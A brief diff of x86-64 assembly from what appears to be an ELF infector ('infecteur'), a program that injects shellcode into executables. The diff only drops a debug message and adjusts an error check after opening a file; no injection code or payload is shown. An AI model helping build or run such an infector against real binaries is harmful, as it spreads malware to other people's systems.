@@ -23,8 +23,6 @@ default rel
 %define PF_X    1
 
 section .data
-    msg db "parcer: alive", 10
-    msg_len equ $ - msg
     msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
     msg_usage_len equ $ - msg_usage
 
@@ -47,7 +45,7 @@ _start:
     mov rax, 2  ; syscall ouvert
     syscall
     test rax, rax
-    jl .usage
+    js .usage
     mov [fd], rax
 
     ;lseek
